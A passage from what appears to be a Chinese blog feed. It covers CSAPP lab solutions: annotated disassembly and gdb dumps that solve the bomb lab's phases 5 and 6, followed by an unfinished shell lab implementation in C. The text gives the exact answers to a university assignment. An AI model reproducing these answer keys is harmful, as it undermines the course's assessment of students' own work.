  0x76    0x62   0x79     0x6c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">0x40245e处是flyers字符串</span></span><br><span class="line">(gdb) x/7c 0x40245e</span><br><span class="line">0x40245e:       102 &#x27;f&#x27; 108 &#x27;l&#x27; 121 &#x27;y&#x27; 101 &#x27;e&#x27; 114 &#x27;r&#x27; 115 &#x27;s&#x27; 0 &#x27;\000&#x27;</span><br><span class="line"></span><br><span class="line">(gdb) x/7xb 0x40245e</span><br><span class="line">0x40245e:       0x66    0x6c    0x79    0x65    0x72    0x73    0x00</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flyers对应的ascii值 0x66 0x6c 0x79 0x65 0x72 0x73</span></span><br></pre></td></tr></table></figure><p>基于0x4024b0的对应偏移量为0x9 0xF 0xE 0x5 0x6 0x7。</p><p>即六个字符的低4bit分别为0x9 0xF 0xE 0x5 0x6 0x7。</p><p>若输入为大写字母，将低4bit的值加上0x40，获得输入字符串IONEFG。</p><p>若输入为小写字母，将低4bit的值加上0x60，获得输入字符串ionefg。</p><blockquote><p>IONEFG(或ionefg)</p></blockquote><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004010</span>f4 &lt;phase_6&gt;:</span><br><span class="line">  <span class="number">4010</span>f4: <span class="number">41</span> <span class="number">56</span>                 <span class="keyword">push</span>   %<span class="built_in">r14</span></span><br><span class="line">  <span class="number">4010</span>f6: <span class="number">41</span> <span class="number">55</span>                 <span class="keyword">push</span>   %<span class="built_in">r13</span></span><br><span class="line">  <span class="number">4010</span>f8: <span class="number">41</span> <span class="number">54</span>                 <span class="keyword">push</span>   %<span class="built_in">r12</span></span><br><span class="line">  <span class="number">4010</span>fa: <span class="number">55</span>                    <span class="keyword">push</span>   %rbp</span><br><span class="line">  <span class="number">4010</span>fb: <span class="number">53</span>                    <span class="keyword">push</span>   %rbx</span><br><span class="line">  <span class="number">4010</span>fc: <span class="number">48</span> <span class="number">83</span> ec <span class="number">50</span>           <span class="keyword">sub</span>    $<span class="number">0x50</span>,%rsp                   <span class="meta"># 开辟空间</span></span><br><span class="line">  <span class="number">401100</span>: <span class="number">49</span> <span class="number">89</span> e5              <span class="keyword">mov</span>    %rsp,%<span class="built_in">r13</span></span><br><span class="line">  <span class="number">401103</span>: <span class="number">48</span> <span class="number">89</span> e6              <span class="keyword">mov</span>    %rsp,%rsi</span><br><span class="line">  <span class="number">401106</span>: e8 <span class="number">51</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>        callq  <span class="number">40145</span>c &lt;read_six_numbers&gt;    <span class="meta"># 读入6个值，%rdi %rsi %rdx %rcx %r8 %r9</span></span><br><span class="line">  <span class="meta">#################################################################</span></span><br><span class="line">  <span class="number">40110</span>b: <span class="number">49</span> <span class="number">89</span> e6              <span class="keyword">mov</span>    %rsp,%<span class="built_in">r14</span></span><br><span class="line">  <span class="number">40110</span>e: <span class="number">41</span> bc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     <span class="keyword">mov</span>    $<span class="number">0x0</span>,%r12d</span><br><span class="line">  <span class="number">401114</span>: <span class="number">4</span>c <span class="number">89</span> ed              <span class="keyword">mov</span>    %<span class="built_in">r13</span>,%rbp</span><br><span class="line">  <span class="number">401117</span>: <span class="number">41</span> <span class="number">8</span>b <span class="number">45</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">0x0</span>(%<span class="built_in">r13</span>),%eax</span><br><span class="line">  <span class="number">40111</span>b: <span class="number">83</span> e8 <span class="number">01</span>              <span class="keyword">sub</span>    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">40111</span>e: <span class="number">83</span> f8 <span class="number">05</span>              cmp    $<span class="number">0x5</span>,%eax                    <span class="meta"># 数字&lt;=6</span></span><br><span class="line">  <span class="number">401121</span>: <span class="number">76</span> <span class="number">05</span>                 jbe    <span class="number">401128</span> &lt;phase_6+<span class="number">0x34</span>&gt;</span><br><span class="line">  <span class="number">401123</span>: e8 <span class="number">12</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>        callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401128</span>: <span class="number">41</span> <span class="number">83</span> c4 <span class="number">01</span>           <span class="keyword">add</span>    $<span class="number">0x1</span>,%r12d</span><br><span class="line">  <span class="number">40112</span>c: <span class="number">41</span> <span class="number">83</span> fc <span class="number">06</span>           cmp    $<span class="number">0x6</span>,%r12d</span><br><span class="line">  <span class="number">401130</span>: <span class="number">74</span> <span class="number">21</span>                 je     <span class="number">401153</span> &lt;phase_6+<span class="number">0x5f</span>&gt;        <span class="meta"># 程序出口</span></span><br><span class="line">  <span class="number">401132</span>: <span class="number">44</span> <span class="number">89</span> e3              <span class="keyword">mov</span>    %r12d,%ebx</span><br><span class="line">  <span class="number">401135</span>: <span class="number">48</span> <span class="number">63</span> c3              movslq %ebx,%rax</span><br><span class="line">  <span class="number">401138</span>: <span class="number">8</span>b <span class="number">04</span> <span class="number">84</span>              <span class="keyword">mov</span>    (%rsp,%rax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">40113</span>b: <span class="number">39</span> <span class="number">45</span> <span class="number">00</span>              cmp    %eax,<span class="number">0x0</span>(%rbp)</span><br><span class="line">  <span class="number">40113</span>e: <span class="number">75</span> <span class="number">05</span>                 jne    <span class="number">401145</span> &lt;phase_6+<span class="number">0x51</span>&gt;</span><br><span class="line">  <span class="number">401140</span>: e8 f5 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>        callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401145</span>: <span class="number">83</span> c3 <span class="number">01</span>              <span class="keyword">add</span>    $<span class="number">0x1</span>,%ebx</span><br><span class="line">  <span class="number">401148</span>: <span class="number">83</span> fb <span class="number">05</span>              cmp    $<span class="number">0x5</span>,%ebx</span><br><span class="line">  <span class="number">40114</span>b: <span class="number">7</span>e e8                 jle    <span class="number">401135</span> &lt;phase_6+<span class="number">0x41</span>&gt;</span><br><span class="line">  <span class="number">40114</span>d: <span class="number">49</span> <span class="number">83</span> c5 <span class="number">04</span>           <span class="keyword">add</span>    $<span class="number">0x4</span>,%<span class="built_in">r13</span></span><br><span class="line">  <span class="number">401151</span>: eb c1                 <span class="keyword">jmp</span>    <span class="number">401114</span> &lt;phase_6+<span class="number">0x20</span>&gt;</span><br><span class="line">  <span class="meta">#################################################################</span></span><br><span class="line">  <span class="number">401153</span>: <span class="number">48</span> <span class="number">8</span>d <span class="number">74</span> <span class="number">24</span> <span class="number">18</span>        lea    <span class="number">0x18</span>(%rsp),%rsi              <span class="meta"># %rsi = (%rsp+0x18)的地址 第六个数的地址</span></span><br><span class="line">  <span class="number">401158</span>: <span class="number">4</span>c <span class="number">89</span> f0              <span class="keyword">mov</span>    %<span class="built_in">r14</span>,%rax                    <span class="meta"># %rax = %r14;</span></span><br><span class="line">  <span class="number">40115</span>b: b9 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        <span class="keyword">mov</span>    $<span class="number">0x7</span>,%ecx                    <span class="meta">#</span></span><br><span class="line">  <span class="number">401160</span>: <span class="number">89</span> ca                 <span class="keyword">mov</span>    %ecx,%edx                    <span class="meta">#</span></span><br><span class="line">  <span class="number">401162</span>: <span class="number">2</span>b <span class="number">10</span>                 <span class="keyword">sub</span>    (%rax),%edx                  <span class="meta">#</span></span><br><span class="line">  <span class="number">401164</span>: <span class="number">89</span> <span class="number">10</span>                 <span class="keyword">mov</span>    %edx,(%rax)                  <span class="meta"># (%rax) = 7-(%rax);</span></span><br><span class="line">  <span class="number">401166</span>: <span class="number">48</span> <span class="number">83</span> c0 <span class="number">04</span>           <span class="keyword">add</span>    $<span class="number">0x4</span>,%rax                    <span class="meta"># %rax += 4;</span></span><br><span class="line">  <span class="number">40116</span>a: <span class="number">48</span> <span class="number">39</span> f0              cmp    %rsi,%rax</span><br><span class="line">  <span class="number">40116</span>d: <span class="number">75</span> f1                 jne    <span class="number">401160</span> &lt;phase_6+<span class="number">0x6c</span>&gt;</span><br><span class="line">  <span class="meta">#################################################################</span></span><br><span class="line">  <span class="number">40116</span>f: be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        <span class="keyword">mov</span>    $<span class="number">0x0</span>,%esi</span><br><span class="line">  <span class="number">401174</span>: eb <span class="number">21</span>                 <span class="keyword">jmp</span>    <span class="number">401197</span> &lt;phase_6+<span class="number">0xa3</span>&gt;</span><br><span class="line">  <span class="number">401176</span>: <span class="number">48</span> <span class="number">8</span>b <span class="number">52</span> <span class="number">08</span>           <span class="keyword">mov</span>    <span class="number">0x8</span>(%rdx),%rdx                       <span class="meta"># 指向链表的下一个节点的首地址</span></span><br><span class="line">  <span class="number">40117</span>a: <span class="number">83</span> c0 <span class="number">01</span>              <span class="keyword">add</span>    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">40117</span>d: <span class="number">39</span> c8                 cmp    %ecx,%eax</span><br><span class="line">  <span class="number">40117</span>f: <span class="number">75</span> f5                 jne    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;                <span class="meta"># 不相等,继续遍历链表,最终 %rdx 指向链表的第 %ecx 个节点</span></span><br><span class="line">  <span class="number">401181</span>: eb <span class="number">05</span>                 <span class="keyword">jmp</span>    <span class="number">401188</span> &lt;phase_6+<span class="number">0x94</span>&gt;</span><br><span class="line">  <span class="number">401183</span>: ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>        <span class="keyword">mov</span>    $<span class="number">0x6032d0</span>,%edx</span><br><span class="line">  <span class="number">401188</span>: <span class="number">48</span> <span class="number">89</span> <span class="number">54</span> <span class="number">74</span> <span class="number">20</span>        <span class="keyword">mov</span>    %rdx,<span class="number">0x20</span>(%rsp,%rsi,<span class="number">2</span>)</span><br><span class="line">  <span class="number">40118</span>d: <span class="number">48</span> <span class="number">83</span> c6 <span class="number">04</span>           <span class="keyword">add</span>    $<span class="number">0x4</span>,%rsi</span><br><span class="line">  <span class="number">401191</span>: <span class="number">48</span> <span class="number">83</span> fe <span class="number">18</span>           cmp    $<span class="number">0x18</span>,%rsi</span><br><span class="line">  <span class="number">401195</span>: <span class="number">74</span> <span class="number">14</span>                 je     <span class="number">4011</span>ab &lt;phase_6+<span class="number">0xb7</span>&gt;</span><br><span class="line">  <span class="number">401197</span>: <span class="number">8</span>b <span class="number">0</span>c <span class="number">34</span>              <span class="keyword">mov</span>    (%rsp,%rsi,<span class="number">1</span>),%ecx</span><br><span class="line">  <span class="number">40119</span>a: <span class="number">83</span> f9 <span class="number">01</span>              cmp    $<span class="number">0x1</span>,%ecx                            <span class="meta"># %ecx是从第1个数到第6个数(7-之后)</span></span><br><span class="line">  <span class="number">40119</span>d: <span class="number">7</span>e e4                 jle    <span class="number">401183</span> &lt;phase_6+<span class="number">0x8f</span>&gt;</span><br><span class="line">  <span class="number">40119</span>f: b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        <span class="keyword">mov</span>    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4011</span>a4: ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>        <span class="keyword">mov</span>    $<span class="number">0x6032d0</span>,%edx                       <span class="meta"># 进入链表</span></span><br><span class="line">  <span class="number">4011</span>a9: eb cb                 <span class="keyword">jmp</span>    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</span><br><span class="line">  <span class="meta">#################################################################</span></span><br><span class="line">  <span class="number">4011</span>ab: <span class="number">48</span> <span class="number">8</span>b <span class="number">5</span>c <span class="number">24</span> <span class="number">20</span>        <span class="keyword">mov</span>    <span class="number">0x20</span>(%rsp),%rbx                      <span class="meta"># 第一个节点的地址</span></span><br><span class="line">  <span class="number">4011</span>b0: <span class="number">48</span> <span class="number">8</span>d <span class="number">44</span> <span class="number">24</span> <span class="number">28</span>        lea    <span class="number">0x28</span>(%rsp),%rax                      <span class="meta"># 第二个节点的地址</span></span><br><span class="line">  <span class="number">4011</span>b5: <span class="number">48</span> <span class="number">8</span>d <span class="number">74</span> <span class="number">24</span> <span class="number">50</span>        lea    <span class="number">0x50</span>(%rsp),%rsi                      <span class="meta"># 结束循环的地址</span></span><br><span class="line">  <span class="number">4011</span>ba: <span class="number">48</span> <span class="number">89</span> d9              <span class="keyword">mov</span>    %rbx,%rcx                            <span class="meta"># %rcx = 前一个节点的首地址</span></span><br><span class="line">  <span class="number">4011</span>bd: <span class="number">48</span> <span class="number">8</span>b <span class="number">10</span>              <span class="keyword">mov</span>    (%rax),%rdx                          <span class="meta"># %rdx = 后一个节点的首地址</span></span><br><span class="line">  <span class="number">4011</span>c0: <span class="number">48</span> <span class="number">89</span> <span class="number">51</span> <span class="number">08</span>           <span class="keyword">mov</span>    %rdx,<span class="number">0x8</span>(%rcx)                       <span class="meta"># pNext重新链接</span></span><br><span class="line">  <span class="number">4011</span>c4: <span class="number">48</span> <span class="number">83</span> c0 <span class="number">08</span>           <span class="keyword">add</span>    $<span class="number">0x8</span>,%rax</span><br><span class="line">  <span class="number">4011</span>c8: <span class="number">48</span> <span class="number">39</span> f0              cmp    %rsi,%rax</span><br><span class="line">  <span class="number">4011</span>cb: <span class="number">74</span> <span class="number">05</span>                 je     <span class="number">4011</span>d2 &lt;phase_6+<span class="number">0xde</span>&gt;                <span class="meta"># 出口</span></span><br><span class="line">  <span class="number">4011</span>cd: <span class="number">48</span> <span class="number">89</span> d1              <span class="keyword">mov</span>    %rdx,%rcx                            <span class="meta"># 继续循环</span></span><br><span class="line">  <span class="number">4011</span>d0: eb eb                 <span class="keyword">jmp</span>    <span class="number">4011</span>bd &lt;phase_6+<span class="number">0xc9</span>&gt;</span><br><span class="line">  <span class="meta">#################################################################</span></span><br><span class="line">  <span class="number">4011</span>d2: <span class="number">48</span> c7 <span class="number">42</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  movq   $<span class="number">0x0</span>,<span class="number">0x8</span>(%rdx)</span><br><span class="line">  <span class="number">4011</span>d9: <span class="number">00</span> </span><br><span class="line">  <span class="number">4011</span>da: bd <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        <span class="keyword">mov</span>    $<span class="number">0x5</span>,%ebp                            <span class="meta"># 固定五次循环</span></span><br><span class="line">  <span class="number">4011</span>df: <span class="number">48</span> <span class="number">8</span>b <span class="number">43</span> <span class="number">08</span>           <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rax                       <span class="meta"># pNext</span></span><br><span class="line">  <span class="number">4011e3</span>: <span class="number">8</span>b <span class="number">00</span>                 <span class="keyword">mov</span>    (%rax),%eax                          <span class="meta"># 第二个节点的值</span></span><br><span class="line">  <span class="number">4011e5</span>: <span class="number">39</span> <span class="number">03</span>                 cmp    %eax,(%rbx)                          <span class="meta"># 比较两个节点中第一个字段值的大小</span></span><br><span class="line">  <span class="number">4011e7</span>: <span class="number">7</span>d <span class="number">05</span>                 jge    <span class="number">4011</span>ee &lt;phase_6+<span class="number">0xfa</span>&gt;</span><br><span class="line">  <span class="number">4011e9</span>: e8 <span class="number">4</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>        callq  <span class="number">40143</span>a &lt;explode_bomb&gt;                <span class="meta"># &lt;就爆炸</span></span><br><span class="line">  <span class="number">4011</span>ee: <span class="number">48</span> <span class="number">8</span>b <span class="number">5</span>b <span class="number">08</span>           <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rbx                       <span class="meta"># &gt;=</span></span><br><span class="line">  <span class="number">4011</span>f2: <span class="number">83</span> ed <span class="number">01</span>              <span class="keyword">sub</span>    $<span class="number">0x1</span>,%ebp</span><br><span class="line">  <span class="number">4011</span>f5: <span class="number">75</span> e8                 jne    <span class="number">4011</span>df &lt;phase_6+<span class="number">0xeb</span>&gt;</span><br><span class="line">  <span class="meta">#################################################################</span></span><br><span class="line">  <span class="number">4011</span>f7: <span class="number">48</span> <span class="number">83</span> c4 <span class="number">50</span>           <span class="keyword">add</span>    $<span class="number">0x50</span>,%rsp</span><br><span class="line">  <span class="number">4011</span>fb: <span class="number">5</span>b                    <span class="keyword">pop</span>    %rbx</span><br><span class="line">  <span class="number">4011</span>fc: <span class="number">5</span>d                    <span class="keyword">pop</span>    %rbp</span><br><span class="line">  <span class="number">4011</span>fd: <span class="number">41</span> <span class="number">5</span>c                 <span class="keyword">pop</span>    %<span class="built_in">r12</span></span><br><span class="line">  <span class="number">4011</span>ff: <span class="number">41</span> <span class="number">5</span>d                 <span class="keyword">pop</span>    %<span class="built_in">r13</span></span><br><span class="line">  <span class="number">401201</span>: <span class="number">41</span> <span class="number">5</span>e                 <span class="keyword">pop</span>    %<span class="built_in">r14</span></span><br><span class="line">  <span class="number">401203</span>: c3                    retq   </span><br></pre></td></tr></table></figure><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>movl是以寄存器运算结果为游标，访问内存获得该地址的值，然后给目标寄存器赋值。</p><p>leal是获得寄存器的运算结果，很多时候会遇到用来完成类似于mips或者arm上三元运算的工作，一步完成加法。</p><h3 id="代码分段"><a href="#代码分段" class="headerlink" title="代码分段"></a>代码分段</h3><h4 id="0x4010f4-gt-0x401106"><a href="#0x4010f4-gt-0x401106" class="headerlink" title="0x4010f4 -&gt; 0x401106"></a>0x4010f4 -&gt; 0x401106</h4><p>这段代码是把输入的6个数字读到栈上，存在rsp到rsp+0x18(6个数字共占了24个字节)。</p><h4 id="0x40110b-gt-0x401151"><a href="#0x40110b-gt-0x401151" class="headerlink" title="0x40110b -&gt; 0x401151"></a>0x40110b -&gt; 0x401151</h4><p>这段代码是循环检查6个数字的初值，两个条件：1. 每个数字都小于6，2. 每个数字都不相等。</p><h4 id="0x401153-gt-0x40116d"><a href="#0x401153-gt-0x40116d" class="headerlink" title="0x401153 -&gt; 0x40116d"></a>0x401153 -&gt; 0x40116d</h4><p>这段代码是将每个数字都用7减一遍，6个数由a[i]变成了7-a[i]，例如：</p><p><strong>a[i]: 4, 1, 2, 5, 6, 3</strong><br><strong>7-a[i]: 3, 6, 5, 2, 1, 4</strong></p><h4 id="0x40116f-gt-0x4011a9"><a href="#0x40116f-gt-0x4011a9" class="headerlink" title="0x40116f -&gt; 0x4011a9"></a>0x40116f -&gt; 0x4011a9</h4><p>这段代码十分复杂，可以通过代入特定值的方式来了解其行为，其功能是根据7-a[i]的值，将链表的node的首地址在栈中排序，例如：</p><p><strong>7-a[i]: 3, 6, 5, 2, 1, 4</strong></p><p>node的排序： node3, node6, node5, node2, node1, node4，也就是赋值给了0x20+%rsp开始的一片区域。</p><p>这里值得注意的地方是0x20(%rsp,%rsi,2), 输入6个数是4字节, 现在每个数对应1个8字节的. 如果是1, 存的内容是$0x6032d0.</p><h4 id="0x4011ab-gt-0x4011d2"><a href="#0x4011ab-gt-0x4011d2" class="headerlink" title="0x4011ab -&gt; 0x4011d2"></a>0x4011ab -&gt; 0x4011d2</h4><p>基于上一步在栈中的node顺序，将链表中的各个node重新链接起来，通过更改node.pNext来完成，最后一个node的pNext置为0；</p><h4 id="0x4011d9-gt-结束"><a href="#0x4011d9-gt-结束" class="headerlink" title="0x4011d9 -&gt; 结束"></a>0x4011d9 -&gt; 结束</h4><p>检查在上一步中完成排序的链表，是否是按照值从大到小排列的，如果不是的话，bomb就炸了。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/24xw 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:       0x0000014c      0x00000001      0x006032e0      0x00000000</span><br><span class="line">0x6032e0 &lt;node2&gt;:       0x000000a8      0x00000002      0x006032f0      0x00000000</span><br><span class="line">0x6032f0 &lt;node3&gt;:       0x0000039c      0x00000003      0x00603300      0x00000000</span><br><span class="line">0x603300 &lt;node4&gt;:       0x000002b3      0x00000004      0x00603310      0x00000000</span><br><span class="line">0x603310 &lt;node5&gt;:       0x000001dd      0x00000005      0x00603320      0x00000000</span><br><span class="line">0x603320 &lt;node6&gt;:       0x000001bb      0x00000006      0x00000000      0x00000000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">                      节点值                           下个节点地址值</span></span><br></pre></td></tr></table></figure><p>排序是   3 4 5 6 1 2，7-之前是 4 3 2 1 6 5。</p><blockquote><p>4 3 2 1 6 5</p></blockquote><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><img src="https://img.lfalive.top/CSAPP-bomb/1.png" style="zoom:60%;" />]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP实验——shell lab</title>
      <link href="/2021/12/05/CSAPP-shlab/"/>
      <url>/2021/12/05/CSAPP-shlab/</url>
      
        <content type="html"><![CDATA[<h2 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h2><p><a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><blockquote><p>Students implement simple logical, two’s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on data.</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/89224358">CSAPP实验之shell lab</a></p><p>实验要求和可选辅助函数见参考链接。</p><h2 id="void-eval-char-cmdline"><a href="#void-eval-char-cmdline" class="headerlink" title="void eval(char *cmdline)"></a>void eval(char *cmdline)</h2><p>解析并执行命令。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> &#123;</span><br><span class="line"><span class="type">char</span> *argv[MAXARGS];</span><br><span class="line"><span class="type">char</span> buf[MAXLINE];</span><br><span class="line"><span class="type">int</span> bg;</span><br><span class="line"><span class="type">int</span> state;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">sigset_t</span> mask_all, mask_one, prev;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在函数内部加阻塞set</span></span><br><span class="line">sigfillset(&amp;mask_all);</span><br><span class="line">sigemptyset(&amp;mask_one);</span><br><span class="line">sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">bg = parseline(buf, argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有参数就退出</span></span><br><span class="line"><span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果不是内置指令</span></span><br><span class="line"><span class="keyword">if</span> (!builtin_cmd(argv)) &#123;</span><br><span class="line"><span class="comment">// 为了避免父进程运行到addjob之前子进程就退出了，所以在fork子进程前阻塞sigchld信号，addjob后解除</span></span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev);</span><br><span class="line"><span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// 子进程继承了父进程的阻塞向量，也要解除阻塞，避免收不到它本身的子进程的信号</span></span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 改进程组与自己pid一样</span></span><br><span class="line"><span class="keyword">if</span> (setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;SETPGID ERROR&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 正常运行execve函数会替换内存，不会返回/退出，所以必须要加exit，否则会一直运行下去，子进程会开始运行父进程的代码</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 父进程</span></span><br><span class="line">state = bg ? BG : FG;</span><br><span class="line"><span class="comment">// 依然是加塞，阻塞所有信号</span></span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">addjob(jobs, pid, state, cmdline);</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后台任务则打印，前台则等待子进程结束</span></span><br><span class="line"><span class="keyword">if</span> (state == FG)</span><br><span class="line">waitfg(pid);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>); <span class="comment">// 操纵全局变量，阻塞信号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">&#125;</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-builtin-cmd-char-argv"><a href="#int-builtin-cmd-char-argv" class="headerlink" title="int builtin_cmd(char **argv)"></a>int builtin_cmd(char **argv)</h2><p>检测命令是否为内置命令<code>quit</code>、<code>fg</code>、<code>bg</code>、<code>jobs</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">   <span class="type">sigset_t</span> mask_all, prev;</span><br><span class="line">   sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 判断是不是内置函数，不是就返回，注意内置命令有要继续操作的一定要返回1</span></span><br><span class="line">   <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>))</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;</span><br><span class="line">      sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">      listjobs(jobs);</span><br><span class="line">      sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) &#123;</span><br><span class="line">      do_bgfg(argv);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;&amp;&quot;</span>))<span class="comment">// 对单独的&amp;不处理</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="void-do-bgfg-char-argv"><a href="#void-do-bgfg-char-argv" class="headerlink" title="void do_bgfg(char **argv)"></a>void do_bgfg(char **argv)</h2><p>实现<code>bg</code>、<code>fg</code>命令。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">   <span class="comment">// 没有参数，其实应该也加上判断参数个数的语句才比较完整</span></span><br><span class="line">   <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> id;</span><br><span class="line">   <span class="type">sigset_t</span> mask_all, prev;</span><br><span class="line">   sigfillset(&amp;mask_all);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// bg %5 和bg 5不一样,一个是对一个作业操作，另一个是对进程操作，而job代表了一个进程组。</span></span><br><span class="line">   <span class="comment">// 根据tshref的样例输出看有多少种情况</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%%%d&quot;</span>, &amp;id) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">      job = getjobjid(jobs, 